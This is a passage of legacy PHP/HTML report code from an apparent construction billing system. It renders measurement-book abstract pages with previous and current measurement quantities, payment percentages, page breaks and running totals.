		//$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."@@";
		
		if($prev_item_flag == "NI")
		{
			$AggTitleFlag = "Main Agreement - ";
			$DI_Amount_EI_Amount_Str .= $SlmNetAmount."*".$DpmNetAmount."*".$SlmDpmNetAmount."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		}
		else
		{
			$AggTitleFlag = "Part Agreement - ".$no_of_supp_agg; $no_of_supp_agg++;
			$DI_Amount_EI_Amount_Str .= $SLMAmountNI_DI_EI."*".$DPMAmountNI_DI_EI."*".$UPTOAmountNI_DI_EI."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		}
		//$DI_Amount_EI_Amount_Str .= $SlmNetAmount."*".$DpmNetAmount."*".$SlmDpmNetAmount."*".$page."*".$abstmbno."*".$txtbox_id_di_ei."*".$AggTitleFlag."@@";
		
		$DIHead = 1; $Line = $LineIncr+$Linecheck; $page++; $LineTemp = 0;
		$SLMAmountNI_DI_EI = 0;
		$DPMAmountNI_DI_EI = 0;
		$UPTOAmountNI_DI_EI = 0;
		$txtbox_id_di_ei++;
	}
	//$Line = $LineIncr+$Linecheck; $page++;
	//echo $Line;
}
/*if($EIHead == 0)
{
	if($item_flag == "EI")
	{
?>
		<tr>
			<td colspan='3' align='right' class='labelbold'>C/o Page No / Abstract MB No </td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
			<td align='right' class='labelbold'></td>
			<td></td>
		</tr>
		<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
		</table>
		<p style='page-break-after:always;'></p>
		<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
			<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
		</table>
<?php 
		echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Extra Item</i></u></div>";
		$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
		echo $table_supp;
		echo "<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>";
		echo $tablehead;
		$EIHead = 1;
	}
	//$Line = $LineIncr+$Linecheck; $page++;
}*/
/*************************************** THIS PART IS FOR DISPLAY SUPPLEMENTARY AGREEMNT TITLE SECTION   - ENDS HERE ****************************************/

if($LineTemp >= 34){ $Line = 34; $LineTemp = 0; }
if($Line >= 34)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php if($page >= 100){ echo $NextMBPageList[$NextMbIncr]; ?>/ Abstract MB No <?php echo $NextMBList[$NextMbIncr]; }else{ echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; } ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php if($page >= 100){ echo $NextMBList[$NextMbIncr]; }else{ echo $abstmbno; } ?> <!--(Print version : <?php echo $gen_version; ?>)-->&nbsp;&nbsp;</td></tr>
</table>
<?php 
if($item_flag == "NI"){
	echo $table;
}else{
	$table_supp = GetSupplementaryWorkTitle($supp_sheetid,$runn_acc_bill_no);
	//if($item_flag == "DI"){
	//echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Deviated Item</i></u></div>";
	//}else if($item_flag == "EI"){
	//echo "<div width='100%' align='center' class='labelbold'><u>Supplementary Agreement for <i>Extra Item</i></u></div>";
	//}else{
	//echo "";
	//}
	echo $table_supp;
}
?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($UPTOAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($DPMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($SLMAmountNI_DI_EI, 2, '.', ''); ?></td>
	<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
</tr>
<?php
$Line = $LineIncr+$Linecheck; $page++;
}
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }


//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="" class="labelprint">
	<!--<td  align='center' width='' class='labelsmall' style=" border-top-color:#666666; border-bottom-color:#0A9CC5; background-color:#0A9CC5" id="td_popupbutton<?php echo $table_group_row; ?>">
		<input type="checkbox" name="check" id="ch_item<?php //echo $table_group_row; ?>" value="<?php //echo $checkbox_str; ?>"  />
	</td>-->
	<td width="61px" align="center" style="border-top-color:#666666;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top-color:#666666;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $item_flag; ?>&nbsp;</td>
</tr>
<?php 
$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		//echo "D = ".$dpm_mesurementbook_details."<br/>";
		//echo "D = ".count($eplodedpm)."<br/>";
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			//print_r($DpmArrMbidList);echo $MeasurementbookidDpm."<br/>";
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{
				$ArrUniqueVal 	= array_unique($DpmArrMbidList); //$ArrUniqueVal = array( 0 => 5656, 1 => 5641, 2 => 5626 );
				$UniqueCount 	= count($ArrUniqueVal);//print_r($ArrUniqueVal);exit;
				$x6=0;
				$count_1 		= count($DpmArrAmbList);
				$count_2 		= count($DpmArrAmbPgList);
				$AMBookNo 		= $DpmArrAmbList[$count_1-1];
				$AMBookPage 	= $DpmArrAmbList[$count_2-1];
				//while($x6<=$UniqueCount)
				foreach($ArrUniqueVal as $StartKey)
				{
					//$StartKey = $ArrUniqueVal[$x6]; 
					$PaidDpmPerc = $DpmArrPercent[$StartKey];
					$rowspancnt = $dpm_cnt;//$UniqueCount+$DpmTemp;
					$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum = $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' width='' class=''><?php echo $DpmQuantityty_1;//$QtyDpmSlm_1; ?></td>
						<td  align='right' width='' class=''>
							<?php 
							//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
							if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
								//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
								$DpmAmount_1 = $DpmAmount_1 + $QSPPDPMMasterArr[$StartKey];
							}
							echo number_format($DpmAmount_1, 2, '.', '');
							$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
							?>
						</td>
						<td  align='right' width='6%' class='' rowspan=""></td>
						<td  align='right' width='3%' class='' rowspan="">
						<?php
						if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
							echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
							$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
						}else{	
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							} 
						}
						?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
						<?php 
						if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
							echo "Ref- P".$QSPPRefMBPageArr[$StartKey][1]."/".$QSPPRefMBPageArr[$StartKey][0];
						}else{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
						}
						?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							if(in_array($StartKey, $DpmArrMbidList))
							{ 
								$Arrkey = array_search($StartKey, $DpmArrMbidList);
								$QtyDpmSlm_22 = $DpmArrQuantityList[$Arrkey];
								$PercDpmSlm_22 = $DpmPercSum;//$DpmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_22 = $QtyDpmSlm_22 * $PercDpmSlm_22 * $rate/100;
								$total_percent_dpm_slm_22 = $DpmPercSum+$PercDpmSlm_22;
								
							}
							/*else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								//$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * $DpmPercSum * $rate/100;
							}*/
?>
							<tr border='1' bgcolor="#FFFFFF" class="labelprint">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''>
								<?php 
									//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
									if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
										//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
										$Dpm_Slm_Amount_22 = $Dpm_Slm_Amount_22 + $QSPPDPMMasterArr[$StartKey];
									}
									echo number_format($Dpm_Slm_Amount_22, 2, '.', ''); 
									$dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_22; 
								?>
								</td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
								<?php
								if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
									echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
									$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
								}else{
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
								}
								?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
								<?php 
								if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
									echo "Ref- P".$QSPPRefMBPageArr[$StartKey][1]."/".$QSPPRefMBPageArr[$StartKey][0];
								}else{
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo $total_percent_dpm_slm_2."% Paid"; 
									}
									else{
										echo $DpmPercSum."% Paid";
									}
								}
								?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
					//echo $StartKey."<br/>";
				}
				//echo $MeasurementbookidDpm;print_r($temp_array);echo "<br/>";
				//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
			}
			//print_r($temp_array);
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php 
								//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
								if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
									//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
									$dpmamt = $dpmamt + $QSPPDPMMasterArr[$MeasurementbookidDpm];
								}
								
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
								}
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo "Ref- P".$QSPPRefMBPageArr[$MeasurementbookidDpm][1]."/".$QSPPRefMBPageArr[$MeasurementbookidDpm][0];
							}else{
								echo $total_percent_dpm_slm_3."% Paid";
							}
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					$PaidDpmPerc2 = 0;
					$PaidDpmPerc2 = $paymentpercent_dpm;
					if(in_array($MeasurementbookidDpm, $DpmArrMbidList)){
						$ArrUniqueVal2 	= array_unique($DpmArrMbidList); 
						$UniqueCount2 	= count($ArrUniqueVal2); 
						foreach($ArrUniqueVal2 as $StartKey2=>$StartKey2Val){
							$PaidDpmPerc2 	= $PaidDpmPerc2+$DpmArrPayPercentList[$StartKey2]; 
							$DpmKeyresult2 	= checkPartpayment($DpmArrMbidList,$StartKey2);
							if($DpmKeyresult2 != ""){
								$explodeDpmKeyresult2 = explode("*",$DpmKeyresult2); 
								for($z7=0; $z7<count($explodeDpmKeyresult2); $z7++){
									$key2 		= $explodeDpmKeyresult2[$z7];
									$PaidDpmPerc2 = $PaidDpmPerc2 + $DpmArrPayPercentList[$key2]; 
								}
							}
						}
					}
					$paymentpercent_dpmA = 0; $PercDpmSlm_4 = 0;
					$paymentpercent_dpmA = $PaidDpmPerc2;
					$dpmamtA 				= $dpmqty * $rate * $PaidDpmPerc2 / 100;
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpmA + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF" class="labelprint">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>
					<?php 
						//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
						if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
							//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
							$dpmamtA = $dpmamtA + $QSPPDPMMasterArr[$MeasurementbookidDpm];
						}
						echo number_format($dpmamtA, 2, '.', ''); 
						$dpm_amount_item  = $dpm_amount_item + $dpmamtA; 
					?>
					</td>
					<?php 
					if($dummy == 0) 
					{
					?>
						<td  align='right' width='' class=''></td>
						<td  align='right' width='' class=''>
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
								}
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo "Ref- P".$QSPPRefMBPageArr[$MeasurementbookidDpm][1]."/".$QSPPRefMBPageArr[$MeasurementbookidDpm][0];
							}else{
								//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								//{
									echo $total_percent_dpm_slm_4."% Paid";
								//}
							}
							?>
						</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
			$DpmTemp++; 
		}
		//$rowcount++;
	}
//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
	$mbooktype_sql = mysql_query($mbooktype_query);
	$flagtype = @mysql_result($mbooktype_sql,0,'flag');
	if($flagtype == 1) { $mbookdescription = "/General MB No. "; }
	if($flagtype == 2) { $mbookdescription = "/Steel MB No. "; }

	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		//echo "B = ".count($eplodeslm)."<br/>";
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = round(($slm_amount_item + $slmamt),2);
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
					echo $paymentpercent."% Paid"; 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
			
?>
		<tr border='1' bgcolor="#FFFFFF" class="labelprint">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
	 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}
	if($PartPayremarks != "")
	{
?>
		<tr border='1' class="labelprint" style="font-size:10px;">
			<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
		</tr>
<?php	
		$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
		// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
	}	
//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
$total_amt_item = round(($slm_amount_item + $dpm_amount_item),2);
?>
	<tr border='1' class="labelprint" bgcolor="">
		<!--<td  align='left' width='3%' class=' label' style="border-bottom-color:#666666">&nbsp;</td>-->
		<td  align='left' width='' class=''>&nbsp;<?php //echo $Line; ?></td>
		<td  align='right' width='' class='labelbold'>TOTAL</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_qty_item, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo $rate; ?>
		</td>
		<td  align='left' width='' class=''>
		<?php echo $unit; ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($total_amt_item, 2, '.', ''); ?>
		</td>
		<td  align='left' width='' class=''>&nbsp;</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($dpm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''>
		<?php echo number_format($slm_amount_item, 2, '.', ''); ?>
		</td>
		<td  align='right' width='' class=''><?php //echo $Line; ?>&nbsp;</td>
	</tr>
	<?php UpdateItemAbstractPageNo($abstsheetid,$abstmbno,$subdivid,$page,$divid,$fromdate,$todate,$rbn,$IsFinRAB); ?>
	<?php  $rowcount++; $Line++;/*echo "F = ".$Line."<br/>";*/ //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";} ?>
	
<!--------------------------------------- Cement Variation Starts------------------->
	
<?php
				
				if(in_array($subdivid,$CVItemArr)){
					$CVRate 		= $CemVarMasterArr[$subdivid][0];
					$CvDiffence 	= $CemVarMasterArr[$subdivid][1];
					
					$SLMCvVarQty	= round($SLMCemVarQtyArr[$subdivid],$decimal);
